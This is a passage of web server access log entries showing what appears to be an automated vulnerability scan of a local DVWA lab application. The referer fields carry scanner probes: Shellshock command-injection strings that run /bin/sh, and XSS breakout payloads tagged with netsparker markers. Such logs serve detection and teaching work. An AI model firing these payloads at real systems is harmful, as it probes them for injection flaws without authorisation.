      "\"192.168.4.164 - - [22/Dec/2023:15:19:35 +0300] \"GET /DVWA/vulnerabilities/csrf/ HTTP/1.1\" 200 1764 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:47 +0300] \"GET /DVWA/vulnerabilities/csrf/ HTTP/1.1\" 200 1763 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00011E)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:47 +0300] \"GET /DVWA/vulnerabilities/csrf/ HTTP/1.1\" 200 1763 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00011F)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:47 +0300] \"GET /DVWA/vulnerabilities/csrf/ HTTP/1.1\" 200 1763 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00011C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:47 +0300] \"GET /DVWA/vulnerabilities/csrf/ HTTP/1.1\" 200 1763 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00011D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:49 +0300] \"GET /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1708 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000136)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:49 +0300] \"GET /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1708 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000137)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:49 +0300] \"GET /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1708 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000134)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:49 +0300] \"GET /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1708 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000135)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:51 +0300] \"GET /DVWA/vulnerabilities/captcha/ HTTP/1.1\" 200 1988 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:51 +0300] \"GET /DVWA/vulnerabilities/captcha/ HTTP/1.1\" 200 1988 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000158)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:51 +0300] \"GET /DVWA/vulnerabilities/captcha/ HTTP/1.1\" 200 1988 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000159)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:52 +0300] \"GET /DVWA/vulnerabilities/captcha/ HTTP/1.1\" 200 1988 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00015A)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:52 +0300] \"GET /DVWA/vulnerabilities/captcha/ HTTP/1.1\" 200 1988 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00015B)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:53 +0300] \"GET /DVWA/vulnerabilities/fi/ HTTP/1.1\" 200 1494 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:53 +0300] \"GET /DVWA/vulnerabilities/fi/ HTTP/1.1\" 200 1494 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000172)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:53 +0300] \"GET /DVWA/vulnerabilities/fi/ HTTP/1.1\" 200 1494 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000173)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:54 +0300] \"GET /DVWA/vulnerabilities/fi/ HTTP/1.1\" 200 1494 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000174)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:54 +0300] \"GET /DVWA/vulnerabilities/fi/ HTTP/1.1\" 200 1494 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000175)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:00 +0300] \"GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1\" 200 1637 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:03 +0300] \"GET /DVWA/vulnerabilities/sqli/ HTTP/1.1\" 200 1730 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:04 +0300] \"GET /DVWA/vulnerabilities/sqli/ HTTP/1.1\" 200 1730 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000194)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:04 +0300] \"GET /DVWA/vulnerabilities/sqli/ HTTP/1.1\" 200 1730 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000195)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:04 +0300] \"GET /DVWA/vulnerabilities/sqli/ HTTP/1.1\" 200 1730 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000192)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:04 +0300] \"GET /DVWA/vulnerabilities/sqli/ HTTP/1.1\" 200 1730 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000193)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:06 +0300] \"GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1\" 200 1739 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:07 +0300] \"GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1\" 200 1739 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001AE)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:07 +0300] \"GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1\" 200 1739 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001AF)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:07 +0300] \"GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1\" 200 1739 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001AC)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:07 +0300] \"GET /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1\" 200 1739 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001AD)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:07 +0300] \"GET /DVWA/vulnerabilities/upload/ HTTP/1.1\" 200 1766 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:09 +0300] \"GET /DVWA/vulnerabilities/upload/ HTTP/1.1\" 200 1766 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001C8)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:09 +0300] \"GET /DVWA/vulnerabilities/upload/ HTTP/1.1\" 200 1766 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001C9)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:09 +0300] \"GET /DVWA/vulnerabilities/upload/ HTTP/1.1\" 200 1766 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001C6)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:09 +0300] \"GET /DVWA/vulnerabilities/upload/ HTTP/1.1\" 200 1766 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001C7)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:10 +0300] \"GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1\" 200 1690 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:10 +0300] \"GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1\" 200 1690 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001E2)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:10 +0300] \"GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1\" 200 1690 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001E3)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:10 +0300] \"GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1\" 200 1690 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001E0)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:10 +0300] \"GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1\" 200 1690 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001E1)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:11 +0300] \"GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1\" 200 1637 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001EA)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:11 +0300] \"GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1\" 200 1637 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0001EB)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:11 +0300] \"GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1\" 200 1637 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001E8)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:11 +0300] \"GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1\" 200 1637 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0001E9)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:12 +0300] \"GET /DVWA/security.php HTTP/1.1\" 200 1802 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:13 +0300] \"GET /DVWA/security.php HTTP/1.1\" 200 1802 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000204)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:13 +0300] \"GET /DVWA/security.php HTTP/1.1\" 200 1802 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000205)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:13 +0300] \"GET /DVWA/security.php HTTP/1.1\" 200 1802 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000202)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:13 +0300] \"GET /DVWA/security.php HTTP/1.1\" 200 1802 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000203)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:14 +0300] \"GET /DVWA/about.php HTTP/1.1\" 200 2282 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:14 +0300] \"GET /DVWA/about.php HTTP/1.1\" 200 2282 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000214)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:14 +0300] \"GET /DVWA/about.php HTTP/1.1\" 200 2282 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000215)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:14 +0300] \"GET /DVWA/about.php HTTP/1.1\" 200 2282 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000212)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:14 +0300] \"GET /DVWA/about.php HTTP/1.1\" 200 2282 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000213)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:16 +0300] \"GET /DVWA/include.php HTTP/1.1\" 404 507 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:16 +0300] \"GET /DVWA/include.php HTTP/1.1\" 404 507 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000238)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:16 +0300] \"GET /DVWA/include.php HTTP/1.1\" 404 507 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000239)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:16 +0300] \"GET /DVWA/include.php HTTP/1.1\" 404 507 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000236)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:16 +0300] \"GET /DVWA/include.php HTTP/1.1\" 404 507 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000237)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:17 +0300] \"GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1\" 200 1921 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:18 +0300] \"GET /DVWA/phpinfo.php HTTP/1.1\" 200 19554 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:18 +0300] \"GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1\" 200 1921 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000252)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:18 +0300] \"GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1\" 200 1921 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000253)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:18 +0300] \"GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1\" 200 1921 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000250)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:18 +0300] \"GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1\" 200 1921 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000251)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:22 +0300] \"GET /DVWA/phpinfo.php HTTP/1.1\" 200 19528 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00026A)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:23 +0300] \"GET /DVWA/phpinfo.php HTTP/1.1\" 200 19530 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00026B)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/dvwa/css/login.css HTTP/1.1\" 200 668 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/dvwa/css/login.css HTTP/1.1\" 200 668 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000274)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/dvwa/css/login.css HTTP/1.1\" 200 668 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000275)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/dvwa/css/login.css HTTP/1.1\" 200 668 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000272)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/dvwa/css/login.css HTTP/1.1\" 200 668 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000273)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/phpinfo.php HTTP/1.1\" 200 19531 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00026C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:24 +0300] \"GET /DVWA/phpinfo.php HTTP/1.1\" 200 19533 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00026D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:25 +0300] \"GET /DVWA/login.php HTTP/1.1\" 200 986 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:26 +0300] \"GET /DVWA/login.php HTTP/1.1\" 200 986 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000294)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:20:26 +0300] \"GET /DVWA/login.php HTTP/1.1\" 200 986 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000295)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
